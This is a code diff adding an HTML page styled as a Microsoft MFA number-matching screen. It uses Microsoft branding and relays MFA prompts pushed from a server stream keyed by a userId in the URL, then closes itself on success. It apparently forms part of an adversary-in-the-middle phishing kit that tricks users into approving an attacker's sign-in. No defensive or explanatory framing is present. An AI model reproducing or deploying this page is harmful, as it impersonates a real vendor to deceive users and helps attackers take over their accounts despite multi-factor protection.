@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft MFA - Number Matching</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0078d4, #106ebe);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .mfa-container {
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .microsoft-logo {
+            width: 120px;
+            height: 30px;
+            margin-bottom: 30px;
+        }
+        .number-display {
+            font-size: 48px;
+            font-weight: bold;
+            color: #0078d4;
+            background: #f3f2f1;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            letter-spacing: 8px;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .status-waiting { background-color: #ffaa44; }
+        .status-completed { background-color: #107c10; }
+        .status-failed { background-color: #d13438; }
+        .instructions {
+            color: #323130;
+            margin: 20px 0;
+            line-height: 1.5;
+        }
+        .spinner {
+            border: 3px solid #f3f3f1;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="mfa-container">
+        <svg class="microsoft-logo" viewBox="0 0 108 23">
+            <path fill="#0078d4" d="M44.836 4.6v13.8h-2.4V7.583L38.119 18.4h-1.588L32.215 7.583V18.4h-2.4V4.6h3.308L37.328 15.983 41.528 4.6h3.308zm18.028 0v2.4h-5.6V11h4.8v2.4h-4.8v3h5.6v2.4h-8V4.6h8zm-13.2 0v13.8h-2.4V4.6h2.4zm-8.4 0v2.4h-3.6v11.4h-2.4V7h-3.6V4.6h9.6z"/>
+        </svg>
+        
+        <h2>Multi-Factor Authentication</h2>
+        
+        <div id="mfa-content">
+            <div class="instructions">
+                <span class="status-indicator status-waiting" id="status-dot"></span>
+                <span id="status-text">Initializing authentication...</span>
+            </div>
+            
+            <div id="number-container" style="display: none;">
+                <p>Enter this number in your Microsoft Authenticator app:</p>
+                <div class="number-display" id="display-number">--</div>
+            </div>
+            
+            <div class="spinner" id="loading-spinner"></div>
+        </div>
+    </div>
+
+    <script>
+        const userId = new URLSearchParams(window.location.search).get('userId');
+        const statusDot = document.getElementById('status-dot');
+        const statusText = document.getElementById('status-text');
+        const numberContainer = document.getElementById('number-container');
+        const displayNumber = document.getElementById('display-number');
+        const spinner = document.getElementById('loading-spinner');
+
+        // Connect to MFA status stream
+        const eventSource = new EventSource(`/mfa/stream/${userId}`);
+        
+        eventSource.onmessage = function(event) {
+            const data = JSON.parse(event.data);
+            updateMFAStatus(data);
+        };
+
+        function updateMFAStatus(data) {
+            switch(data.status) {
+                case 'number_matching':
+                    statusDot.className = 'status-indicator status-waiting';
+                    statusText.textContent = 'Number matching required';
+                    displayNumber.textContent = data.number || '--';
+                    numberContainer.style.display = 'block';
+                    spinner.style.display = 'block';
+                    break;
+                    
+                case 'push_notification':
+                    statusDot.className = 'status-indicator status-waiting';
+                    statusText.textContent = 'Approve the notification on your phone';
+                    numberContainer.style.display = 'none';
+                    spinner.style.display = 'block';
+                    break;
+                    
+                case 'sms_code':
+                    statusDot.className = 'status-indicator status-waiting';
+                    statusText.textContent = 'Enter the code from SMS/call';
+                    numberContainer.style.display = 'none';
+                    spinner.style.display = 'block';
+                    break;
+                    
+                case 'completed':
+                    statusDot.className = 'status-indicator status-completed';
+                    statusText.textContent = 'Authentication successful!';
+                    spinner.style.display = 'none';
+                    setTimeout(() => {
+                        window.close();
+                    }, 2000);
+                    break;
+                    
+                case 'failed':
+                    statusDot.className = 'status-indicator status-failed';
+                    statusText.textContent = 'Authentication failed';
+                    spinner.style.display = 'none';
+                    break;
+                    
+                default:
+                    statusText.textContent = 'Waiting for authentication...';
+            }
+        }
+
+        // Handle connection errors
+        eventSource.onerror = function(event) {
+            console.error('MFA stream error:', event);
+            statusText.textContent = 'Connection error - please refresh';
+        };
+    </script>
+</body>
+</html>
